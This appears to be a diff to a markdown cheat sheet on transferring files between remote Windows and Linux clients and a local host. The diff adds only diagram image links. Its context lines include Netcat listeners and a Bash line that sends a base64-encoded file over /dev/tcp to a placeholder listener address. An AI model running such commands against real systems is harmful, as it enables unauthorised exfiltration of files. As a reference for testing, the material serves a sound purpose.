@@ -8,6 +8,8 @@
 
 #### Send a file from a *remote* Windows client to a *local* Linux host
 
+![](./imgs/win-lin-rev.png)
+
 ##### If you want to send the raw contents:
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *local* Linux host:
@@ -43,6 +45,8 @@ nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
 ***
 
 #### Retrieve a file from a *remote* Windows client to a *local* Linux host
+
+![](./imgs/win-lin-bind.png)
 
 ##### If you want to send the raw contents:
 
@@ -95,6 +99,8 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 
 #### Send file from *remote* Linux client to *local* Linux host
 
+![](./imgs/lin-lin-rev.png)
+
 ##### If you want to send the raw contents:
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *local* Linux host:
@@ -138,6 +144,8 @@ base64 -w0 /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort
 ***
 
 #### Retrieve a file from a *remote* Linux client to a *local* Linux host
+
+![](./imgs/lin-lin-bind.png)
 
 ##### If you want to send the raw contents:
 
@@ -186,6 +194,8 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 
 #### Send file from *remote* Windows client to *local* Windows host
 
+![](./imgs/win-win-rev.png)
+
 ##### If you want to send the raw contents:
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *local* Windows host:
@@ -224,6 +234,8 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 ***
 
 #### Retrieve a file from a *remote* Windows client to a *local* Windows host
+
+![](./imgs/win-win-bind.png)
 
 ##### If you want to send the raw contents:
 
